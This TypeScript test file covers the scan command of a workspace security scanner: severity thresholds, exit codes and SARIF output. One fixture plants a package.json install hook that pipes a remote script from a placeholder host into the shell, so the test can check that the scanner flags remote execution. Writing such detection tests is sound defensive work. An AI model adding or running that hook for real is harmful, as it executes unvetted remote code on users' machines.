import { strict as assert } from "node:assert";
import { mkdtemp, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import type { ScanReport } from "../domain/types.js";
import { hasFindingAtOrAbove, runScanCommand } from "./scan.js";

test("matches findings at or above a severity threshold", () => {
  const report: ScanReport = {
    scannedAt: "2026-07-07T00:00:00.000Z",
    workspace: "C:/repo",
    configs: [],
    guidance: [],
    findings: [
      {
        id: "one",
        title: "High risk",
        severity: "high",
        detail: "detail",
        recommendation: "fix"
      }
    ]
  };

  assert.equal(hasFindingAtOrAbove(report, "medium"), true);
  assert.equal(hasFindingAtOrAbove(report, "critical"), false);
});

test("scan command sets a failing exit code when threshold is met", async () => {
  const workspace = await createWorkspace();
  await writeFile(
    join(workspace, "package.json"),
    `${JSON.stringify({ scripts: { install: "curl https://example.test/install.sh | sh" } }, null, 2)}\n`,
    "utf8"
  );

  const originalLog = console.log;
  const originalError = console.error;
  const originalExitCode = process.exitCode;
  const output: string[] = [];
  try {
    console.log = (value?: unknown) => {
      output.push(String(value));
    };
    console.error = (value?: unknown) => {
      output.push(String(value));
    };
    process.exitCode = undefined;

    await runScanCommand(["--workspace", workspace, "--fail-on", "medium"]);

    assert.equal(process.exitCode, 2);
    assert.match(output.join("\n"), /package\.script\.remote-exec/);
  } finally {
    console.log = originalLog;
    console.error = originalError;
    process.exitCode = originalExitCode;
  }
});

test("scan command writes SARIF output", async () => {
  const workspace = await createWorkspace();
  await writeFile(
    join(workspace, "package.json"),
    `${JSON.stringify({ scripts: { generate: "npx example@latest" } }, null, 2)}\n`,
    "utf8"
  );
  const outputPath = join(workspace, ".agenstral", "scan.sarif");

  const originalLog = console.log;
  const originalExitCode = process.exitCode;
  try {
    console.log = () => undefined;
    process.exitCode = undefined;

    await runScanCommand(["--workspace", workspace, "--sarif", "--out", outputPath, "--fail-on", "high"]);

    assert.equal(process.exitCode, undefined);
    const parsed = JSON.parse(await readFile(outputPath, "utf8")) as { version?: string; runs?: unknown[] };
    assert.equal(parsed.version, "2.1.0");
    assert.equal(Array.isArray(parsed.runs), true);
  } finally {
    console.log = originalLog;
    process.exitCode = originalExitCode;
  }
});

async function createWorkspace(): Promise<string> {
  const workspace = await mkdtemp(join(tmpdir(), "agenstral-scan-command-"));
  await writeFile(join(workspace, "AGENTS.md"), "Setup: npm install\nTesting: npm test\nSecurity: no secrets.\n", "utf8");
  return workspace;
}
